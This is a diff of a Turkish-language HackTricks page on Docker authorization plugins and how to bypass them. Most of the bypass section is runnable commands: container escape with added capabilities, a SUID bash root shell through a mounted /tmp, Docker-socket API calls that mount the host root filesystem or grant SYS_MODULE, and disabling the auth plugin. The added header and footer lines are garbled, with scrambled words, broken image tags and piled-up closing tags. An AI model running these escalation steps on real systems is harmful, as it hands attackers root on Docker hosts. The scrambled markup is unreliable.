@@ -1,83 +1,88 @@
-<details>
+{% hnnt styte=" acceas" %}
+GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
+Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>
+<dotsilp>
 
-HackTricks'ı desteklemenin diğer yolları:
+<oummpr>SupportHackTricks</smmay>
 
-* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
-* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
+* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
 
-Docker'ın varsayılan yetkilendirme modeli "hepsi ya da hiçbiri" şeklindedir. Docker daemon'a erişim izni olan herhangi bir kullanıcı, herhangi bir Docker istemci komutunu çalıştırabilir. Aynısı, Docker'ın Engine API'sini kullanarak daemon ile iletişim kuran çağrılar için de geçerlidir. Daha fazla erişim kontrolü gerektiğinde, yetkilendirme eklentileri oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon'a erişimi yönetmek için ayrıntılı erişim politikaları yapılandırabilir.
+**Docker’ın** kutudan çıktığı gibi **yetkilendirme** modeli **ya hepsi ya hiçbiri** şeklindedir. Docker daemon’a erişim izni olan herhangi bir kullanıcı, **herhangi bir** Docker istemci **komutunu** **çalıştırabilir**. Bu, Docker’ın Engine API’sini kullanarak daemon’a ulaşan çağrılar için de geçerlidir. Eğer **daha fazla erişim kontrolü** gerekiyorsa, **yetkilendirme eklentileri** oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon’a erişimi yönetmek için **ayrıntılı erişim** politikaları **yapılandırabilir**.
 
 # Temel mimari
 
-Docker Auth eklentileri, Docker Daemon'a yapılan isteklerin kullanıcıya ve istenen eyleme bağlı olarak Docker Daemon tarafından kabul edilip edilmeyeceğini belirleyen harici eklentilerdir.
+Docker Auth eklentileri, **kullanıcı** tarafından talep edilen **hareketleri** Docker Daemon’a **izin verme/red etme** amacıyla kullanabileceğiniz **harici** **eklenti**lerdir.
 
-**[Aşağıdaki bilgiler dokümantasyondan alınmıştır](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Aşağıdaki bilgi belgelerden alınmıştır](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-CLI veya Engine API aracılığıyla Docker daemon'a yapılan bir HTTP isteği, kimlik doğrulama alt sistemi tarafından yüklü kimlik doğrulama eklentisine iletilir. İstek, kullanıcı (çağrı yapan) ve komut bağlamını içerir. Eklenti, isteği kabul etmek veya reddetmek için sorumludur.
+Bir **HTTP** **isteği**, CLI aracılığıyla veya Engine API’si üzerinden Docker **daemon**’ına yapıldığında, **kimlik doğrulama** **alt sistemi** isteği yüklü **kimlik doğrulama** **eklenti**(ler)ine **gönderir**. İstek, kullanıcı (çağrıcı) ve komut bağlamını içerir. **Eklenti**, isteği **izin verme** veya **red etme** kararı vermekten sorumludur.
 
-Aşağıdaki sıra diyagramları, izin verme ve reddetme yetkilendirme akışını göstermektedir:
+Aşağıdaki sıralama diyagramları, izin verme ve red etme yetkilendirme akışını göstermektedir:
 
-![Yetkilendirme İzin Verme Akışı](https://docs.docker.com/engine/extend/images/authz_allow.png)
+![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
-![Yetkilendirme Reddetme Akışı](https://docs.docker.com/engine/extend/images/authz_deny.png)
+![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Eklentiye gönderilen her istek, kimlik doğrulanmış kullanıcıyı, HTTP başlıklarını ve istek/yanıt gövdesini içerir. Sadece kullanıcı adı ve kullanılan kimlik doğrulama yöntemi eklentiye iletilir. En önemlisi, kullanıcı kimlik bilgileri veya belirteçleri iletilmez. Son olarak, tüm istek/yanıt gövdeleri yetkilendirme eklentisine gönderilmez. Yalnızca `Content-Type`'ı `text/*` veya `application/json` olan istek/yanıt gövdeleri gönderilir.
+Eklentiye gönderilen her istek, **kimlik doğrulaması yapılmış kullanıcıyı, HTTP başlıklarını ve istek/yanıt gövdesini** içerir. Sadece **kullanıcı adı** ve kullanılan **kimlik doğrulama yöntemi** eklentiye iletilir. En önemlisi, **hiçbir** kullanıcı **kimlik bilgisi** veya token iletilmez. Son olarak, **tüm istek/yanıt gövdeleri** yetkilendirme eklentisine gönderilmez. Sadece `Content-Type` değeri `text/*` veya `application/json` olan istek/yanıt gövdeleri gönderilir.
 
-HTTP bağlantısını ele geçirebilecek komutlar (`HTTP Upgrade`) için (örneğin `exec` gibi), yetkilendirme eklentisi yalnızca başlangıç HTTP istekleri için çağrılır. Eklenti komutu onayladığında, yetkilendirme geri kalan akışa uygulanmaz. Özellikle, akış verileri yetkilendirme eklentilerine iletilmez. `logs` ve `events` gibi parçalı HTTP yanıtı döndüren komutlar için, yalnızca HTTP isteği yetkilendirme eklentilerine gönderilir.
+HTTP bağlantısını potansiyel olarak ele geçirebilecek komutlar (`HTTP Upgrade`), örneğin `exec`, için yetkilendirme eklentisi yalnızca ilk HTTP istekleri için çağrılır. Eklenti komutu onayladıktan sonra, yetkilendirme akışın geri kalanına uygulanmaz. Özellikle, akış verileri yetkilendirme eklentilerine iletilmez. Parçalı HTTP yanıtı döndüren komutlar, örneğin `logs` ve `events`, için yalnızca HTTP isteği yetkilendirme eklentilerine gönderilir.
 
-İstek/yanıt işleme sırasında, bazı yetkilendirme akışlarının Docker daemon'a ek sorgular yapması gerekebilir. Bu tür akışları tamamlamak için, eklentiler düzenli bir kullanıcı gibi daemon API'sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklenti, bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırabilmesi için araçlar sağlamalıdır.
+İstek/yanıt işleme sırasında, bazı yetkilendirme akışları Docker daemon’a ek sorgular yapmayı gerektirebilir. Bu tür akışları tamamlamak için, eklentiler, normal bir kullanıcı gibi daemon API’sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklenti, bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırması için gerekli araçları sağlamalıdır.
 
-## Birden Fazla Eklenti
+## Birkaç Eklenti
 
-Eklentinizi Docker daemon başlangıcının bir parçası olarak **kaydetmek** sizin sorumluluğunuzdadır. Birden fazla eklenti kurabilir ve birbirine bağlayabilirsiniz. Bu zincir sıralanabilir. Her istek, zincir üzerinden sırayla geçer. Kaynağa erişim, tüm eklentilerin erişimi onaylaması durumunda sağlanır.
+**Eklentinizi** Docker daemon **başlangıcı** sırasında **kaydetmekten** siz sorumlusunuz. **Birden fazla eklenti yükleyebilir ve bunları bir araya getirebilirsiniz**. Bu zincir sıralı olabilir. Daemon’a yapılan her istek, zincir boyunca sırayla geçer. **Tüm eklentiler kaynağa erişim izni verdiğinde**, erişim izni verilir.
 
 # Eklenti Örnekleri
 
 ## Twistlock AuthZ Broker
 
-[**authz**](https://github.com/twistlock/authz) eklentisi, her kullanıcının hangi API uç noktalarına erişebileceğini çok kolay bir şekilde kontrol etmenizi sağlayan bir **JSON** dosyası oluşturmanıza izin verir.
+Eklenti [**authz**](https://github.com/twistlock/authz), **istekleri yetkilendirmek için** eklentinin **okuyacağı** basit bir **JSON** dosyası oluşturmanıza olanak tanır. Bu nedenle, her API uç noktasının hangi kullanıcılar tarafından erişilebileceğini çok kolay bir şekilde kontrol etme fırsatı sunar.
 
-İşte Alice ve Bob'un yeni konteynerler oluşturmasına izin veren bir örnek: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
+Bu, Alice ve Bob’un yeni konteynerler oluşturmasına izin verecek bir örnektir: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-İstenen URL ile eylem arasındaki ilişkiyi [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) sayfasında bulabilirsiniz. Eylem adı ile eylem arasındaki ilişkiyi [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) sayfasında bulabilirsiniz.
+[route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) sayfasında, istenen URL ile eylem arasındaki ilişkiyi bulabilirsiniz. [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) sayfasında ise eylem adı ile eylem arasındaki ilişkiyi bulabilirsiniz.
 
-## Basit Eklenti Öğretici
+## Basit Eklenti Eğitimi
 
-Kurulum ve hata ayıklama hakkında ayrıntılı bilgi içeren **anlaşılması kolay bir eklenti**yi [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot) adresinde bulabilirsiniz.
+Kurulum ve hata ayıklama hakkında ayrıntılı bilgiye sahip **anlaşılması kolay bir eklenti** bulabilirsiniz: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
 Nasıl çalıştığını anlamak için `README` ve `plugin.go` kodunu okuyun.
 
 # Docker Auth Eklenti Atlatma
 
-## Erişimi Sırala
+## Erişimi Belirleme
 
-Kontrol edilmesi gereken temel şeyler **hangi uç noktaların izin verildiği** ve **Hangi HostConfig değerlerinin izin verildiği**dir.
+Kontrol edilmesi gereken ana şeyler, **hangi uç noktaların izin verildiği** ve **hangi HostConfig değerlerinin izin verildiğidir**.
 
-Bu sıralamayı yapmak için [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler) aracını kullanabilirsiniz.
+Bu belirlemeyi yapmak için **şu aracı kullanabilirsiniz** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
-## Yasaklanan `run --privileged`
+## izin verilmeyen `run --privileged`
 
 ### Minimum Yetkiler
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
-### Bir konteyner çalıştırma ve ardından ayrıcalıklı bir oturum elde etme
+### Bir konteyner çalıştırmak ve ardından ayrıcalıklı bir oturum almak
 
-Bu durumda sistem yöneticisi, kullanıcıların `--privileged` bayrağıyla birlikte hacimleri bağlamasını ve konteynere herhangi bir ek yetenek vermesini **yasakladı**:
+Bu durumda sistem yöneticisi **kullanıcıların hacimleri bağlamasını ve `--privileged` bayrağı ile konteyner çalıştırmasını** veya konteynere herhangi bir ek yetenek vermesini engelledi:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-Ancak, bir kullanıcı **çalışan konteyner içinde bir kabuk oluşturabilir ve ek ayrıcalıklar verebilir**:
+Ancak, bir kullanıcı **çalışan konteyner içinde bir shell oluşturabilir ve ona ek ayrıcalıklar verebilir**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -89,11 +94,11 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-Şimdi, kullanıcı önceden tartışılan tekniklerden herhangi birini kullanarak konteynerden kaçabilir ve ana bilgisayarda ayrıcalıkları yükseltebilir.
+Şimdi, kullanıcı [**daha önce tartışılan tekniklerden**](./#privileged-flag) herhangi birini kullanarak konteynerden çıkabilir ve **yetkileri artırabilir**.
 
 ## Yazılabilir Klasörü Bağlama
 
-Bu durumda sistem yöneticisi, kullanıcıların konteyneri `--privileged` bayrağıyla çalıştırmalarını veya konteynere herhangi bir ek yetenek vermesini engelledi ve yalnızca `/tmp` klasörünü bağlamalarına izin verdi:
+Bu durumda sistem yöneticisi **kullanıcıların `--privileged` bayrağı ile konteyner çalıştırmalarını yasakladı** veya konteynere herhangi bir ek yetki vermedi ve yalnızca `/tmp` klasörünü bağlamalarına izin verdi:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -103,25 +108,24 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 {% hint style="info" %}
-Not: Belki `/tmp` klasörünü bağlayamazsınız, ancak **farklı yazılabilir bir klasörü** bağlayabilirsiniz. Yazılabilir dizinleri şu komutla bulabilirsiniz: `find / -writable -type d 2>/dev/null`
+Not edin ki `/tmp` klasörünü bağlayamayabilirsiniz ama **farklı bir yazılabilir klasör** bağlayabilirsiniz. Yazılabilir dizinleri bulmak için: `find / -writable -type d 2>/dev/null` komutunu kullanabilirsiniz.
 
-**Not: Bir Linux makinesindeki tüm dizinler suid bitini desteklemeyebilir!** Suid bitini destekleyen dizinleri kontrol etmek için `mount | grep -v "nosuid"` komutunu çalıştırın. Örneğin, genellikle `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` ve `/var/lib/lxcfs` suid bitini desteklemez.
+**Not edin ki bir linux makinesindeki tüm dizinler suid bitini desteklemeyecektir!** Hangi dizinlerin suid bitini desteklediğini kontrol etmek için `mount | grep -v "nosuid"` komutunu çalıştırın. Örneğin genellikle `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` ve `/var/lib/lxcfs` suid bitini desteklemez.
 
-Ayrıca, **`/etc`** veya **yapılandırma dosyalarını içeren başka bir klasörü** bağlayabilirseniz, kök olarak docker konteynerinden bu dosyaları kötüye kullanarak ayrıcalıkları yükseltebilirsiniz (belki `/etc/shadow` dosyasını değiştirerek).
+Ayrıca, eğer **`/etc`** veya **konfigürasyon dosyalarını içeren** başka bir klasörü bağlayabiliyorsanız, bunları docker konteynerinden root olarak değiştirip **host'ta kötüye kullanmak** ve ayrıcalıkları artırmak için (belki `/etc/shadow` dosyasını değiştirerek) kullanabilirsiniz.
 {% endhint %}
 
-## Kontrol Edilmeyen API Uç Noktası
+## Kontrolsüz API Uç Noktası
 
-Bu eklentiyi yapılandıran sistem yöneticisinin sorumluluğu, her kullanıcının hangi eylemleri ve hangi ayrıcalıklarla gerçekleştirebileceğini kontrol etmektir. Bu nedenle, yönetici uç noktaları ve özniteliklerle **kara liste** yaklaşımı benimserse, bazılarını **unutabilir** ve bu da saldırganın ayrıcalıkları yükseltmesine izin verebilir.
+Bu eklentiyi yapılandıran sistem yöneticisinin sorumluluğu, her kullanıcının hangi eylemleri ve hangi ayrıcalıklarla gerçekleştirebileceğini kontrol etmektir. Bu nedenle, eğer yönetici uç noktalar ve nitelikler ile ilgili bir **kara liste** yaklaşımı benimserse, bir saldırganın **ayrıcalıkları artırmasına** izin verebilecek bazılarını **unutabilir.**
 
-Docker API'sini [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) adresinden kontrol edebilirsiniz.
+Docker API'sini [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) adresinde kontrol edebilirsiniz.
 
-## Kontrol Edilmeyen JSON Yapısı
+## Kontrolsüz JSON Yapısı
 
-### Root'ta Bağlamalar
+### Kökte Bağlantılar
 
-Sistem yöneticisi docker güvenlik duvarını yapılandırırken [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) gibi önemli bir parametreyi "**Binds**" unutmuş olabilir.\
-Aşağıdaki örnekte, bu yapılandırma hatasını kötüye kullanarak ana bilgisayarın root (/) klasörünü bağlayan bir konteyner oluşturup çalıştırmak mümkündür:
+Sistem yöneticisi docker güvenlik duvarını yapılandırırken [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) gibi bazı önemli parametreleri "**Binds**" unuttuğu için bu yanlış yapılandırmayı kötüye kullanarak host'un kök (/) klasörünü bağlayan ve çalıştıran bir konteyner oluşturmak mümkündür:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -132,30 +136,30 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 {% hint style="warning" %}
-Bu örnekte JSON'da **`Binds`** parametresini kök düzey bir anahtar olarak kullanıyoruz, ancak API'de **`HostConfig`** anahtarı altında görünüyor.
+Bu örnekte **`Binds`** parametresini JSON'da kök düzey anahtar olarak kullandığımıza dikkat edin, ancak API'de **`HostConfig`** anahtarı altında görünmektedir.
 {% endhint %}
 
-### HostConfig'da Binds
+### HostConfig'deki Binds
 
-**Kök düzeydeki Binds** ile aynı talimatları izleyerek Docker API'sine bu **istemi** gerçekleştirin:
+**Kökteki Binds** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-### Root'ta Mountlar
+### Mounts in root
 
-**Root'ta Bağlantılar** ile aynı talimatları izleyin ve Docker API'sine bu **istemi** gerçekleştirin:
+**Binds in root** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
-### HostConfig'da Mountlar
+### Mounts in HostConfig
 
-Docker API'ye bu **istemi** gerçekleştirerek **root'ta Bağlantılar** ile aynı talimatları izleyin:
+**Kökte Binds** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-## Kontrol Edilmemiş JSON Özniteliği
+## Unchecked JSON Attribute
 
-Sistem yöneticisi docker güvenlik duvarını yapılandırırken, [API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) içindeki "**Capabilities**" özelliği gibi bir parametrenin önemli bir özniteliğini **unutmuş olabilir**. Aşağıdaki örnekte, bu yanlış yapılandırmayı istismar ederek **SYS\_MODULE** yeteneğine sahip bir konteyner oluşturup çalıştırmak mümkündür:
+Sysadmin docker güvenlik duvarını yapılandırırken, [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) içindeki "**HostConfig**" parametresinin "**Capabilities**" gibi bazı önemli özelliklerini **unutmuş olabilir**. Aşağıdaki örnekte, bu yanlış yapılandırmayı kullanarak **SYS\_MODULE** yetkisine sahip bir konteyner oluşturmak ve çalıştırmak mümkündür:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -166,12 +170,12 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 {% hint style="info" %}
-**`HostConfig`**, genellikle konteynerden kaçmak için ilginç **yetkilere** sahip olan anahtar. Ancak, daha önce tartıştığımız gibi, dışında Binds kullanmanın da çalıştığını ve kısıtlamaları atlamak için izin verebileceğini unutmayın.
+**`HostConfig`**, genellikle konteynerden kaçmak için **ilginç** **yetkileri** içeren anahtardır. Ancak, daha önce tartıştığımız gibi, bunun dışındaki Binds kullanımının da işe yaradığını ve kısıtlamaları aşmanıza izin verebileceğini unutmayın.
 {% endhint %}
 
-## Eklentinin Devre Dışı Bırakılması
+## Eklentiyi Devre Dışı Bırakma
 
-Eğer **sistem yöneticisi**, **eklentiyi devre dışı bırakma** yeteneğini **yasaklamayı unutmuşsa**, bunu tamamen devre dışı bırakmak için bundan faydalanabilirsiniz!
+Eğer **sistem yöneticisi**, **eklentiyi** **devre dışı bırakma** yetkisini **yasaklamayı** **unutmuşsa**, bunu tamamen devre dışı bırakmak için kullanabilirsiniz!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -183,27 +187,32 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-**Yükseltme işleminden sonra eklentiyi yeniden etkinleştirmeyi unutmayın**, aksi takdirde docker servisinin yeniden başlatılması çalışmayacaktır!
+Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
 
-## Auth Plugin Bypass yazıları
+## Auth Plugin Bypass writeups
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## Referanslar
+## References
+{% hnt stye="acceas" %}
+AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
+Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
 
-* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)
+<dtil>
 
+<ummr>SupportHackTricks</smmay>
 
-<details>
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
+* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-HackTricks'i desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.
-
+{% endhint %}
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
